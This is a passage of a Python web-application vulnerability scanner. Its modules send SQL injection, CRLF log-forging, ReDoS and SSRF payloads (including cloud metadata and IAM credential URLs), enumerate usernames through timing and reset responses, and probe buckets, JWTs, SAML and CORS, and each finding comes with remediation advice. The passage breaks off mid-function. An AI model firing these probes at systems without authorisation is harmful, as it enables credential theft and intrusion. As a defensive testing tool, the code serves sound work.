                    url=url, payload=sqli_query, cwe="CWE-89", confidence="High"))
            # Batch query amplification (DoS indicator)
            batch = [{"query": "{__typename}"}] * 50
            r2 = safe_post(session, url, json=batch, timeout=TIMEOUT)
            if r2 and r2.status_code == 200 and "__typename" in r2.text:
                findings.append(make_finding("graphql_injection",
                    "GraphQL Batch Query Amplification", "Medium",
                    f"50 batched queries accepted at {ep} — denial-of-service risk.",
                    "Limit batch query count and depth. Implement query cost analysis.",
                    url=url, cwe="CWE-770", confidence="High"))
            # Aliases for field enumeration
            alias_query = "{ a: __typename b: __typename c: __typename }"
            r3 = safe_post(session, url, json={"query": alias_query}, timeout=TIMEOUT)
            if r3 and r3.text.count("__typename") >= 3:
                findings.append(make_finding("graphql_injection",
                    "GraphQL Alias Amplification", "Low",
                    f"GraphQL aliases allow field duplication at {ep}.",
                    "Limit alias count per query. Implement query cost analysis.",
                    url=url, cwe="CWE-770", confidence="High"))
        except Exception: pass
    return findings

# ── LOG INJECTION ──────────────────────────────────────────────────────────────
def module_log_injection(target, session):
    """A09: Log injection / log forging detection."""
    findings = []
    logger.log("LOG-INJ", "Log injection probe …")
    # Unique marker to confirm injection
    MARKER = f"DD_LOG_INJECT_{hashlib.md5(str(time.time()).encode()).hexdigest()[:6]}"
    LOG_PAYLOADS = [
        f"\n[CRITICAL] {MARKER} - Admin logged in",
        f"\r\n{MARKER}",
        f"%0a[ERROR] {MARKER}",
        f"%0d%0a{MARKER}",
    ]
    FUZZ = ["user", "username", "msg", "message", "log", "debug",
            "error", "action", "event", "note", "comment", "query"]
    params = list(dict.fromkeys(extract_params(target) + FUZZ))[:MAX_PARAMS]
    for p in params:
        for pl in LOG_PAYLOADS[:2]:
            try:
                resp = session.get(inject_param(target, p, pl), timeout=TIMEOUT)
                # FP guard: if the marker appears literally in HTML output → reflected
                if MARKER in resp.text:
                    # Additional check: was it reflected in an obvious UI element?
                    if any(tag in resp.text for tag in ["<p>", "<div>", "<span>", "<li>"]):
                        findings.append(make_finding("log_injection",
                            f"Log Injection via '{p}'", "Medium",
                            f"Log injection payload reflected in response via '{p}'. "
                            "If also written to logs, attacker can forge log entries.",
                            "Sanitise CR/LF and special chars from all loggable inputs. "
                            "Use structured logging.",
                            url=inject_param(target, p, pl), payload=pl,
                            cwe="CWE-117", confidence="Medium"))
                        break
            except Exception: pass
    return findings

# ── TIMING ATTACK (Username Enumeration) ──────────────────────────────────────
def module_timing_attack(target, session):
    """
    A07/T1056.004: Timing-based account enumeration — zero-FP via:
    1. Measure 5 baseline timings for fake users (statistical baseline)
    2. Measure 3 timings each for real usernames (reduce jitter)
    3. Required difference: median(real) must exceed median(fake) by >300ms
    4. AND difference must be statistically significant (>3 sigma)
    5. Confirm on a second independent fake username
    """
    findings = []
    import statistics

    LOGIN_PATHS = ["/login", "/api/login", "/api/auth", "/signin",
                   "/api/v1/auth", "/api/v1/login"]
    # Users very likely to exist in real systems
    COMMON_USERNAMES = ["admin", "administrator", "root", "test", "user",
                        "info", "support", "webmaster", "mail", "demo"]
    FAKE_USERNAMES   = [
        "zz_nonexistent_darkdevil_4x3_scan",
        "zzz_fakeusr_dd43_noreply_invalid",
        "aaa_probe_dd43_xxxxxxxxxxxxxxxxx",
    ]
    MIN_DIFF_MS     = 300   # Must differ by at least 300ms (raised from 100ms)
    N_FAKE_SAMPLES  = 5     # Number of fake timing samples for baseline
    N_REAL_SAMPLES  = 3     # Number of real timing samples per username

    for path in LOGIN_PATHS:
        url = target.rstrip("/") + path
        try:
            probe = session.get(url, timeout=TIMEOUT)
            if probe.status_code not in (200, 401): continue
            if "password" not in probe.text.lower() and "login" not in probe.text.lower():
                continue

            # Build fake baseline: 5 timings for 2 different fake usernames
            fake_times = []
            for fake_uname in FAKE_USERNAMES[:2]:
                for _ in range(3):
                    t0 = time.time()
                    session.post(url,
                                 json={"username": fake_uname, "password": "Wr0ng!Pass#"},
                                 timeout=TIMEOUT)
                    fake_times.append((time.time() - t0) * 1000)
                    time.sleep(0.05)

            if len(fake_times) < 4: continue
            fake_median = statistics.median(fake_times)
            fake_stdev  = statistics.stdev(fake_times) if len(fake_times) > 1 else 999

            # Test common usernames: 3 timings each
            slow_users = []
            for uname in COMMON_USERNAMES[:6]:
                times = []
                for _ in range(N_REAL_SAMPLES):
                    t0 = time.time()
                    session.post(url,
                                 json={"username": uname, "password": "Wr0ng!Pass#"},
                                 timeout=TIMEOUT)
                    times.append((time.time() - t0) * 1000)
                    time.sleep(0.05)

                real_median = statistics.median(times)
                diff        = real_median - fake_median

                # Statistical significance: diff must be >300ms AND >3-sigma above fake
                if diff > MIN_DIFF_MS and fake_stdev > 0 and diff > fake_stdev * 3:
                    slow_users.append((uname, real_median, diff))

            if slow_users:
                names_str = ", ".join(
                    f"{u}({m:.0f}ms, +{d:.0f}ms)"
                    for u, m, d in slow_users[:3])
                logger.log("TIMING",
                    f"Account enumeration: {names_str} vs fake baseline {fake_median:.0f}ms",
                    "WARNING")
                findings.append(make_finding("timing_attack",
                    f"Username Enumeration via Response Timing at {path}", "Medium",
                    f"Valid usernames respond significantly slower: {names_str}. "
                    f"Fake baseline: {fake_median:.0f}ms ± {fake_stdev:.0f}ms. "
                    f"Required threshold: >{MIN_DIFF_MS}ms AND >3σ.",
                    "Use constant-time password hashing comparisons. "
                    "Return identical responses for valid/invalid usernames. "
                    "Add artificial uniform delay to all login responses.",
                    url=url,
                    evidence=f"fake_median={fake_median:.0f}ms, slow_users={names_str}",
                    cwe="CWE-208", confidence="Medium"))
                break

        except Exception:
            pass
    return findings


def module_s3_bucket(target, session):
    """A05/T1530: Public cloud storage bucket enumeration."""
    findings = []
    logger.log("S3-BUCKET", "Cloud storage enumeration …")
    domain  = get_domain(target)
    parts   = domain.replace("www.", "").split(".")
    company = parts[0] if parts else domain

    # Generate bucket name candidates
    candidates = set()
    for name in [company, domain.replace(".", "-"), domain.replace(".", "_")]:
        for suffix in ["", "-backup", "-dev", "-staging", "-prod", "-assets",
                       "-media", "-static", "-files", "-data", "-logs",
                       "-uploads", "-public", "-private", "-cdn"]:
            for prefix in ["", "www-", "api-", "app-", "web-"]:
                candidates.add(f"{prefix}{name}{suffix}")

    # S3
    s3_urls = [
        f"https://{b}.s3.amazonaws.com/"
        for b in list(candidates)[:20]
    ] + [
        f"https://s3.amazonaws.com/{b}/"
        for b in list(candidates)[:10]
    ]
    # GCS
    gcs_urls = [f"https://storage.googleapis.com/{b}/" for b in list(candidates)[:10]]
    # Azure Blob
    azure_urls = [f"https://{b}.blob.core.windows.net/" for b in list(candidates)[:10]]

    for url in s3_urls + gcs_urls + azure_urls:
        try:
            r = requests.get(url, timeout=5, verify=False)
            if r.status_code == 200:
                # FP guard: must contain bucket listing indicators
                if any(ind in r.text for ind in ["<ListBucketResult", "<Contents>",
                                                  "<?xml", "LastModified",
                                                  "Key>", "ETag"]):
                    provider = ("S3" if "s3.amazonaws" in url or ".s3." in url
                                else "GCS" if "googleapis" in url else "Azure Blob")
                    bucket = urlparse(url).netloc.split(".")[0]
                    logger.log("S3-BUCKET", f"Public {provider} bucket: {bucket}", "CRITICAL")
                    findings.append(make_finding("s3_bucket",
                        f"Public {provider} Bucket: {bucket}", "Critical",
                        f"Cloud storage bucket '{bucket}' is publicly listable.",
                        "Set bucket ACL to private. Enable bucket versioning and logging. "
                        "Remove all public access permissions.",
                        url=url, cwe="CWE-200", confidence="High"))
            elif r.status_code == 403:
                # Exists but private — report as info
                if "RequestId" in r.text or "<?xml" in r.text:
                    findings.append(make_finding("s3_bucket",
                        f"{urlparse(url).netloc.split('.')[0]} Bucket Exists (Private)",
                        "Info",
                        f"Cloud storage bucket exists at {url} (private, not listable).",
                        "Ensure bucket remains private. Review IAM policies.",
                        url=url, cwe="CWE-200", confidence="High"))
        except Exception: pass
    return findings

# ── WEBSOCKET SECURITY ─────────────────────────────────────────────────────────
def module_websocket(target, session):
    """A05: WebSocket endpoint detection and security check."""
    findings = []
    logger.log("WEBSOCKET", "WebSocket security check …")
    resp = safe_get(session, target)
    if not resp: return findings
    body = resp.text
    # Detect WebSocket endpoints in page source
    ws_patterns = [
        r'new WebSocket\s*\(["\']([^"\']+)["\']',
        r"ws(?:s)?://[^\s\"'<>]+",
        r'socket\.io',
        r"sockjs",
        r"stomp\.js",
    ]
    ws_found = set()
    for pat in ws_patterns:
        for m in re.findall(pat, body, re.I):
            ws_found.add(m)
    if ws_found:
        logger.log("WEBSOCKET", f"Found {len(ws_found)} WS endpoint(s)", "WARNING")
        for ws_url in list(ws_found)[:5]:
            # Check if WS endpoint allows cross-origin connections
            ws_http = ws_url.replace("wss://", "https://").replace("ws://", "http://")
            try:
                r = session.get(ws_http, headers={"Origin": "https://evil-websocket.com"},
                                timeout=TIMEOUT)
                if r.status_code in (101, 200, 426):
                    findings.append(make_finding("websocket",
                        f"WebSocket Endpoint: {ws_url[:60]}", "Medium",
                        "WebSocket endpoint detected. "
                        "Verify Origin header is validated.",
                        "Validate Origin header on WebSocket handshake. "
                        "Implement WS authentication. Use wss:// (TLS).",
                        url=ws_http, cwe="CWE-925", confidence="Medium"))
            except Exception: pass
            if not ws_url.startswith("wss://") and not ws_url.startswith("https://"):
                findings.append(make_finding("websocket",
                    "Unencrypted WebSocket (ws://)", "Medium",
                    f"WebSocket connection uses ws:// (unencrypted): {ws_url}",
                    "Upgrade to wss:// (WebSocket over TLS).",
                    url=ws_url, cwe="CWE-319", confidence="High"))
    return findings

# ── WSDL / SOAP EXPOSURE ───────────────────────────────────────────────────────
def module_wsdl_soap(target, session):
    """A05: WSDL/SOAP service discovery."""
    findings = []
    logger.log("WSDL-SOAP", "WSDL/SOAP discovery …")
    WSDL_PATHS = [
        "?wsdl", "?WSDL", "/service?wsdl", "/ws?wsdl",
        "/api/soap?wsdl", "/soap?wsdl", "/WebService.asmx?wsdl",
        "/services?wsdl", "?disco", "/api.wsdl", "/service.wsdl",
    ]
    WSDL_INDICATORS = ["<wsdl:", "<definitions", "targetNamespace",
                       "<types>", "<message", "<portType", "xmlns:wsdl"]
    for path in WSDL_PATHS:
        url = target.rstrip("/") + path if not path.startswith("?") else target.rstrip("/") + "/" + path
        try:
            r = session.get(url, timeout=TIMEOUT)
            if r.status_code == 200 and any(i in r.text for i in WSDL_INDICATORS):
                logger.log("WSDL-SOAP", f"WSDL exposed at {url}", "WARNING")
                findings.append(make_finding("wsdl_soap",
                    "WSDL / SOAP Service Exposed", "Medium",
                    f"WSDL file accessible at {url}. Reveals all service operations and data types.",
                    "Restrict WSDL access. Remove from production if not needed. "
                    "Implement authentication for SOAP services.",
                    url=url, cwe="CWE-200", confidence="High"))
                # Check for SQL injection in SOAP body
                soap_body = """<?xml version="1.0"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Body><test><id>' OR '1'='1</id></test></soapenv:Body>
</soapenv:Envelope>"""
                r2 = safe_post(session, target.rstrip("/") + "/service",
                               data=soap_body, timeout=TIMEOUT,
                               headers={"Content-Type": "text/xml"})
                if r2 and any(e in r2.text for e in ["SQL syntax", "ORA-", "PSQLException"]):
                    findings.append(make_finding("wsdl_soap",
                        "SQL Injection in SOAP Parameter", "Critical",
                        "SOAP service vulnerable to SQL injection.",
                        "Use parameterised queries for all SOAP inputs.",
                        url=target.rstrip("/") + "/service",
                        cwe="CWE-89", confidence="High"))
        except Exception: pass
    return findings

# ── JWT ALGORITHM CONFUSION ────────────────────────────────────────────────────
def module_jwt_confusion(target, session):
    """A07: JWT RS256→HS256 algorithm confusion attack detection."""
    findings = []
    logger.log("JWT-CONF", "JWT algorithm confusion …")
    resp = safe_get(session, target)
    if not resp: return findings
    JWT_PAT = r"eyJ[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{20,}"
    tokens  = list(set(re.findall(JWT_PAT, resp.text + str(dict(resp.cookies)))))
    for tok in tokens[:3]:
        try:
            parts = tok.split(".")
            if len(parts) != 3: continue
            hdr = json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode(errors="ignore"))
            pay = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode(errors="ignore"))
            alg = hdr.get("alg", "").upper()
            kid = hdr.get("kid", "")

            # RS256 → HS256 confusion candidate
            if alg in ("RS256", "RS384", "RS512", "ES256", "PS256"):
                findings.append(make_finding("jwt_confusion",
                    f"JWT Algorithm Confusion Risk ({alg})", "High",
                    f"JWT uses {alg} (asymmetric). "
                    "If server does not enforce algorithm, RS256→HS256 confusion attack possible.",
                    "Always enforce the expected algorithm server-side. "
                    "Reject tokens with unexpected 'alg' header.",
                    url=target, evidence=f"alg={alg}", cwe="CWE-347", confidence="Medium"))

            # kid injection
            if kid:
                if any(c in kid for c in ["../", "..\\", "file://", "http://", ";"]):
                    findings.append(make_finding("jwt_confusion",
                        "JWT 'kid' Parameter Injection Risk", "High",
                        f"JWT 'kid' contains potentially dangerous value: {kid}",
                        "Validate 'kid' strictly. Use a lookup table, not a file path.",
                        url=target, evidence=f"kid={kid}", cwe="CWE-347", confidence="High"))

            # Weak secret indicators
            if alg == "HS256" and len(parts[2]) < 30:
                findings.append(make_finding("jwt_confusion",
                    "JWT Potentially Weak Signature", "Medium",
                    "JWT HS256 signature appears short — may use weak secret.",
                    "Use cryptographically strong secret (≥256-bit entropy).",
                    url=target, cwe="CWE-347", confidence="Low"))
        except Exception: pass
    return findings

# ── SAML ISSUES ────────────────────────────────────────────────────────────────
def module_saml_issues(target, session):
    """A07: SAML endpoint detection and misconfiguration checks."""
    findings = []
    logger.log("SAML", "SAML detection …")
    SAML_PATHS = [
        "/saml", "/saml/login", "/saml/acs", "/saml/sso",
        "/api/saml", "/auth/saml", "/sso/saml",
        "/saml2", "/saml2/idp", "/saml2/sp",
        "/Shibboleth.sso", "/simplesaml", "/adfs/ls",
    ]
    SAML_INDICATORS = ["SAMLRequest", "SAMLResponse", "samlp:", "saml:",
                       "urn:oasis:names:tc:SAML", "SAML 2.0",
                       "AssertionConsumerService", "EntityID"]
    for path in SAML_PATHS:
        url = target.rstrip("/") + path
        try:
            r = session.get(url, timeout=TIMEOUT)
            body = r.text
            if r.status_code not in (200, 302, 301): continue
            if any(ind in body for ind in SAML_INDICATORS) or r.status_code in (302, 301):
                logger.log("SAML", f"SAML endpoint detected: {path}", "WARNING")
                findings.append(make_finding("saml_issues",
                    f"SAML SSO Endpoint Detected: {path}", "Info",
                    f"SAML endpoint accessible at {path}. "
                    "SAML is complex — verify signature validation, "
                    "XML signature wrapping protection, and entity ID validation.",
                    "Ensure XML signature validation is strict. "
                    "Use well-maintained SAML libraries. "
                    "Validate both the envelope and assertion signatures.",
                    url=url, cwe="CWE-347", confidence="Medium"))

                # Check metadata exposure
                meta_url = target.rstrip("/") + path + "/metadata"
                r2 = session.get(meta_url, timeout=TIMEOUT)
                if r2.status_code == 200 and "EntityDescriptor" in r2.text:
                    findings.append(make_finding("saml_issues",
                        "SAML Metadata Exposed", "Low",
                        f"SAML service provider metadata accessible at {meta_url}.",
                        "Restrict metadata endpoint or require authentication.",
                        url=meta_url, cwe="CWE-200", confidence="High"))
        except Exception: pass
    return findings

# ── CLOUD METADATA DEEP ────────────────────────────────────────────────────────
def module_cloud_metadata_deep(target, session):
    """A10/T1580: Comprehensive cloud metadata SSRF checks."""
    findings = []
    logger.log("CLOUD-META", "Cloud metadata deep check …")
    # All cloud metadata endpoints
    META_TARGETS = [
        # AWS IMDSv1 (vulnerable)
        ("http://169.254.169.254/latest/meta-data/",
         ["ami-id", "instance-id", "hostname", "iam/"], "AWS IMDSv1"),
        # AWS IMDSv2 (token required — if returned w/o token, IMDSv1 enabled)
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         ["RoleName", "AccessKeyId", "SecretAccessKey"], "AWS IAM Credentials"),
        # GCP
        ("http://169.254.169.254/computeMetadata/v1/",
         ["project", "instance", "serviceAccounts"], "GCP Metadata"),
        # GCP alternative
        ("http://metadata.google.internal/computeMetadata/v1/",
         ["project-id", "email"], "GCP Metadata (internal)"),
        # Azure IMDS
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
         ["subscriptionId", "resourceGroupName", "name"], "Azure IMDS"),
        # DigitalOcean
        ("http://169.254.169.254/metadata/v1/",
         ["droplet_id", "hostname", "region"], "DigitalOcean Metadata"),
        # Alibaba Cloud
        ("http://100.100.100.200/latest/meta-data/",
         ["instance-id", "hostname"], "Alibaba Cloud Metadata"),
        # Internal services
        ("http://localhost:8080/actuator/env",
         ["activeProfiles", "JAVA_HOME", "spring"], "Spring Actuator (localhost)"),
        ("http://127.0.0.1:9200/",
         ["cluster_name", "elasticsearch"], "Elasticsearch (localhost)"),
    ]
    FUZZ = ["url", "uri", "path", "dest", "fetch", "site", "load", "data",
            "redirect", "src", "target", "endpoint", "feed", "host", "domain",
            "to", "out", "proxy", "image", "img", "file", "resource", "callback"]
    params = list(dict.fromkeys(extract_params(target) + FUZZ))[:MAX_PARAMS]
    try: bl = session.get(target, timeout=TIMEOUT)
    except: return findings
    _meta_t0 = time.time()                       # cumulative cap so non-cloud targets don't hang
    for p in params:
        if time.time() - _meta_t0 > 15: break
        for meta_url, indicators, cloud in META_TARGETS[:5]:
            if time.time() - _meta_t0 > 15: break
            try:
                resp = session.get(inject_param(target, p, meta_url), timeout=4)
                for ind in indicators:
                    if ind in resp.text and ind not in bl.text:
                        logger.log("CLOUD-META",
                                   f"{cloud} metadata via SSRF in '{p}'", "CRITICAL")
                        findings.append(make_finding("cloud_metadata",
                            f"SSRF to {cloud} in '{p}'", "Critical",
                            f"Server fetched {cloud} endpoint via '{p}'. "
                            f"Indicator: {ind}",
                            "Block all requests to 169.254.169.254, metadata.google.internal, "
                            "and 100.100.100.200. Use IMDSv2 (token-required) for AWS.",
                            url=inject_param(target, p, meta_url), payload=meta_url,
                            cwe="CWE-918", confidence="High"))
                        return findings
            except Exception: pass
    return findings

# ── REGEX DoS (ReDoS) ─────────────────────────────────────────────────────────
def module_regex_dos(target, session):
    """A04/T1499: Detect potential ReDoS by measuring response time on crafted inputs."""
    findings = []
    logger.log("REGEX-DOS", "ReDoS probe …")
    # Classic ReDoS payloads (slow inputs for evil regexes)
    REDOS_PAYLOADS = [
        "a" * 50 + "!",          # Triggers backtracking in (a+)+ patterns
        "a" * 100 + "!",
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaab",
        "x" * 30 + "@" + "x" * 30 + ".com",  # Email regex
        "<" * 30 + "!",          # HTML/XML regex
        "'" * 30 + "!",          # SQL regex
    ]
    FUZZ = ["email", "name", "search", "q", "input", "text", "msg",
            "pattern", "filter", "regex", "query", "data"]
    params = list(dict.fromkeys(extract_params(target) + FUZZ))[:MAX_PARAMS]
    try:
        bl_t0 = time.time()
        session.get(target, timeout=TIMEOUT)
        baseline_ms = (time.time() - bl_t0) * 1000
    except: return findings

    for p in params[:4]:
        for pl in REDOS_PAYLOADS[:3]:
            try:
                t0 = time.time()
                session.get(inject_param(target, p, pl), timeout=TIMEOUT)
                elapsed_ms = (time.time() - t0) * 1000
                # FP guard: must be at least 3x slower than baseline AND > 2 seconds
                if elapsed_ms > 2000 and elapsed_ms > baseline_ms * 3:
                    logger.log("REGEX-DOS",
                               f"ReDoS in '{p}' — {elapsed_ms:.0f}ms vs {baseline_ms:.0f}ms baseline",
                               "WARNING")
                    findings.append(make_finding("regex_dos",
                        f"Potential ReDoS in '{p}'", "Medium",
                        f"Input '{pl[:30]}...' caused {elapsed_ms:.0f}ms response "
                        f"(baseline: {baseline_ms:.0f}ms). May indicate catastrophic backtracking.",
                        "Review all regex patterns. Use linear-time regex engines. "
                        "Add input length limits. Use timeout-bounded regex matching.",
                        url=inject_param(target, p, pl), payload=pl,
                        cwe="CWE-1333", confidence="Medium"))
                    break
            except Exception: pass
    return findings

# ── BROKEN LINK HIJACKING ──────────────────────────────────────────────────────
def module_broken_link_hijacking(target, session):
    """A05/T1189: Find broken external links that could be registered for hijacking."""
    findings = []
    logger.log("BROKEN-LNK", "Broken link hijacking check …")
    resp = safe_get(session, target)
    if not resp: return findings
    # Extract external links
    EXT_PATTERN = r'href=["\'](?:https?://|//)((?:[a-zA-Z0-9\-]+\.)+[a-zA-Z]{2,}[^"\'<>\s]*)["\']'
    ext_links = set(re.findall(EXT_PATTERN, resp.text, re.I))
    SOCIAL_DOMAINS = {"twitter.com", "x.com", "github.com", "linkedin.com",
                      "facebook.com", "instagram.com", "youtube.com",
                      "t.me", "discord.gg", "medium.com"}
    dead_links = []
    for link in list(ext_links)[:30]:
        full_url = f"https://{link}" if not link.startswith("http") else link
        domain = urlparse(full_url).netloc.lower()
        # Skip major social platforms (they're rarely dead)
        if any(sd in domain for sd in SOCIAL_DOMAINS): continue
        try:
            r = requests.get(full_url, timeout=5, verify=False, allow_redirects=True)
            if r.status_code in (404, 410, 0):
                dead_links.append(full_url)
            elif r.status_code in (200,):
                # Check for "domain for sale" or parked pages
                body = r.text.lower()
                if any(p in body for p in ["domain for sale", "this domain",
                                             "buy this domain", "parked",
                                             "domain expired", "godaddy"]):
                    dead_links.append(full_url)
        except requests.exceptions.ConnectionError:
            dead_links.append(full_url)  # domain doesn't exist
        except Exception: pass

    if dead_links:
        logger.log("BROKEN-LNK",
                   f"{len(dead_links)} dead/claimable external link(s)", "WARNING")
        for dead in dead_links[:5]:
            findings.append(make_finding("broken_link",
                f"Broken External Link: {dead[:60]}", "Low",
                f"External resource {dead} returns 404 or is unregistered. "
                "Attackers can register this domain and serve malicious content.",
                "Audit all external links. Remove or update dead links. "
                "Use Subresource Integrity for CDN resources.",
                url=dead, cwe="CWE-601", confidence="Medium"))
    return findings

# ── PASSWORD POLICY ────────────────────────────────────────────────────────────
def module_password_policy(target, session):
    """A07: Detect weak password policies on registration/password change endpoints."""
    findings = []
    logger.log("PASSWD-POL", "Password policy check …")
    REG_PATHS = ["/register", "/signup", "/api/register", "/api/signup",
                 "/api/v1/register", "/api/v1/user", "/user/create"]
    WEAK_PASSWORDS = [
        ("a", "single character"),
        ("12", "two characters"),
        ("pass", "4 characters, common word"),
        ("password", "common dictionary word"),
        ("123456", "numeric sequence"),
        ("aaaaaa", "repeated characters"),
    ]
    for path in REG_PATHS:
        url = target.rstrip("/") + path
        try:
            r = session.get(url, timeout=TIMEOUT)
            if r.status_code not in (200, 201): continue
            body = r.text.lower()
            if not any(f in body for f in ["password", "register", "signup",
                                            "create account"]): continue
            for weak_pwd, desc in WEAK_PASSWORDS[:4]:
                r2 = safe_post(session, url,
                               json={"username": f"test_{hashlib.md5(str(time.time()).encode()).hexdigest()[:4]}",
                                     "email": f"test@test-dd-4x1.com",
                                     "password": weak_pwd},
                               timeout=TIMEOUT)
                if not r2: continue
                resp_body = r2.text.lower()
                # FP guard: success indicator, no password validation error
                success = ["created", "registered", "success", "201", "account"]
                pwd_err  = ["too short", "weak", "must contain", "at least",
                             "minimum", "invalid password", "password requirements"]
                if any(s in resp_body for s in success) and \
                   not any(e in resp_body for e in pwd_err) and \
                   r2.status_code in (200, 201):
                    findings.append(make_finding("password_policy",
                        f"Weak Password Accepted at {path}", "Medium",
                        f"Registration accepted weak password: '{weak_pwd}' ({desc}).",
                        "Enforce minimum password length ≥8. Require mixed characters. "
                        "Check against known-breached password lists (HaveIBeenPwned API).",
                        url=url, payload=f"password={weak_pwd}",
                        cwe="CWE-521", confidence="High"))
                    break
        except Exception: pass
    return findings

# ── CORS PREFLIGHT ABUSE ──────────────────────────────────────────────────────
def module_cors_preflight(target, session):
    """A05: CORS preflight response caching and abuse detection."""
    findings = []
    logger.log("CORS-PRE", "CORS preflight analysis …")
    try:
        evil = "https://evil-cors-preflight-4x1.com"
        # Standard preflight
        r = session.options(target,
                            headers={"Origin": evil,
                                     "Access-Control-Request-Method": "POST",
                                     "Access-Control-Request-Headers": "X-Custom-Header"},
                            timeout=TIMEOUT)
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acam = r.headers.get("Access-Control-Allow-Methods", "")
        acah = r.headers.get("Access-Control-Allow-Headers", "")
        acma = r.headers.get("Access-Control-Max-Age", "0")

        # Wildcard methods
        if acam == "*":
            findings.append(make_finding("cors_preflight",
                "CORS Wildcard Allow-Methods","Medium",
                "Preflight response allows all HTTP methods (*).",
                "Explicitly list only needed methods.",
                url=target, cwe="CWE-942"))
        # Wildcard headers
        if acah == "*":
            findings.append(make_finding("cors_preflight",
                "CORS Wildcard Allow-Headers", "Medium",
                "Preflight response allows all request headers (*).",
                "Explicitly list only needed headers.",
                url=target, cwe="CWE-942"))
        # Long max-age cache
        try:
            if int(acma) > 86400:
                findings.append(make_finding("cors_preflight",
                    f"CORS Preflight Max-Age Too Long ({acma}s)", "Low",
                    f"Preflight result cached for {acma}s. "
                    "Stale permissions persist if policy changes.",
                    "Set Access-Control-Max-Age to ≤7200 (2 hours).",
                    url=target, cwe="CWE-942"))
        except Exception: pass
        # Reflected origin in preflight
        if evil in acao:
            findings.append(make_finding("cors_preflight",
                "CORS Reflects Origin in Preflight", "High",
                "Preflight response reflects attacker origin.",
                "Validate origin against explicit allowlist.",
                url=target, payload=f"Origin: {evil}", cwe="CWE-942"))
    except Exception: pass
    return findings

# ── ACCOUNT ENUMERATION (Multiple methods) ────────────────────────────────────
def module_account_enumeration(target, session):
    """A07/T1056.004: Account existence enumeration via response differences."""
    findings = []
    logger.log("ACCT-ENUM", "Account enumeration check …")
    LOGIN_PATHS  = ["/login", "/api/login", "/api/auth", "/signin", "/api/v1/auth"]
    RESET_PATHS  = ["/forgot-password", "/api/forgot-password", "/api/v1/forgot-password",
                    "/reset-password", "/api/reset", "/api/v1/password-reset"]
    REAL_USERS   = ["admin", "test@test.com", "root", "administrator"]
    FAKE_USERS   = ["zz_nonexistent_dd_4x1@no.invalid",
                    "zzz_fake_dd_4x1_notreal"]

    # Method 1: Password reset enumeration
    for path in RESET_PATHS:
        url = target.rstrip("/") + path
        try:
            r = session.get(url, timeout=TIMEOUT)
            if r.status_code not in (200,): continue
            body = r.text.lower()
            if not any(f in body for f in ["email", "reset", "forgot"]): continue

            # Compare responses for real vs fake
            responses = {}
            for uname in REAL_USERS[:2] + FAKE_USERS[:2]:
                r2 = safe_post(session, url,
                               json={"email": uname, "username": uname},
                               timeout=TIMEOUT)
                if r2: responses[uname] = (r2.status_code, len(r2.text), r2.text[:200])

            if len(responses) >= 3:
                real_codes = [responses[u][0] for u in REAL_USERS[:2] if u in responses]
                fake_codes = [responses[u][0] for u in FAKE_USERS[:2] if u in responses]
                real_lens  = [responses[u][1] for u in REAL_USERS[:2] if u in responses]
                fake_lens  = [responses[u][1] for u in FAKE_USERS[:2] if u in responses]

                code_diff = (real_codes and fake_codes and
                             set(real_codes) != set(fake_codes))
                len_diff  = (real_lens and fake_lens and
                             abs(sum(real_lens)/len(real_lens) -
                                 sum(fake_lens)/len(fake_lens)) > 50)
                if code_diff or len_diff:
                    logger.log("ACCT-ENUM",
                               f"Enumeration at {path} — code_diff={code_diff} len_diff={len_diff}",
                               "WARNING")
                    findings.append(make_finding("account_enum",
                        f"Account Enumeration via Password Reset: {path}", "Medium",
                        f"Different responses for valid vs invalid accounts at {path}.",
                        "Return identical responses for all accounts on password reset. "
                        "Use identical timing regardless of account existence.",
                        url=url, cwe="CWE-204", confidence="Medium"))
        except Exception: pass
    return findings

# ── ERROR FINGERPRINTING ───────────────────────────────────────────────────────
def module_error_fingerprint(target, session):
    """A05: Extract detailed framework/version info from error responses."""
    findings = []
    logger.log("ERR-FPRINT", "Error fingerprinting …")
    # Deliberately provoke errors to extract framework info
    PROVOKE = [
        ("/?syntax_error=<script>", "Script injection probe"),
        ("/?file[]=test&file=../", "Array/traversal probe"),
        ("/?id=1 AND 1=1", "SQL probe"),
        ("/404notfound_dd_4x1", "404 probe"),
        ("/.php_cs", "PHP config probe"),
    ]
    FRAMEWORKS = {
        "Laravel": [r"laravel[/\s]+v?[\d.]+", r"laravel\.com"],
        "Symfony": [r"symfony[/\s]+v?[\d.]+", r"symfony\.com/doc"],
        "Django":  [r"Django[/\s]+v?[\d.]+", r"django version"],
        "Rails":   [r"Ruby on Rails[\s]+[\d.]+"],
        "Spring":  [r"Spring Boot[\s]+[\d.]+", r"spring-framework:[\d.]+"],
        "Express": [r"Express[\s]+[\d.]+"],
        "ASP.NET": [r"ASP\.NET Version:[\s]*([\d.]+)", r"\.NET Framework[\s]*([\d.]+)"],
        "Struts":  [r"Apache Struts[\s]+[\d.]+"],
        "Flask":   [r"Werkzeug[\s]+[\d.]+", r"Python/[\d.]+"],
    }
    for path, desc in PROVOKE:
        url = target.rstrip("/") + path
        try:
            resp = session.get(url, timeout=TIMEOUT)
            body = resp.text + str(resp.headers)
            for fw, patterns in FRAMEWORKS.items():
                for pat in patterns:
                    m = re.search(pat, body, re.I)
                    if m:
                        matched = m.group(0)
                        logger.log("ERR-FPRINT",
                                   f"Version leak ({fw}): {matched}", "WARNING")
                        findings.append(make_finding("error_fingerprint",
                            f"Framework Version Disclosed: {fw}", "Medium",
                            f"Error response reveals {fw} version: '{matched}'. ({desc})",
                            "Disable debug mode. Use generic error pages. "
                            "Remove version information from error responses.",
                            url=url, evidence=matched, cwe="CWE-209", confidence="High"))
        except Exception: pass
    return findings

# ── HTTP DESYNC (H2) ───────────────────────────────────────────────────────────
def module_http_desync(target, session):
    """A05: HTTP/2 to HTTP/1.1 desync indicators."""
    findings = []
    logger.log("H2-DESYNC", "HTTP/2 desync indicators …")
    try:
        # Check if server uses HTTP/2
        import http.client
        parsed = urlparse(target)
        # Send unusual combined Content-Length + Transfer-Encoding
        r = session.get(target, headers={
            "Content-Length": "0",
            "Transfer-Encoding": "chunked"
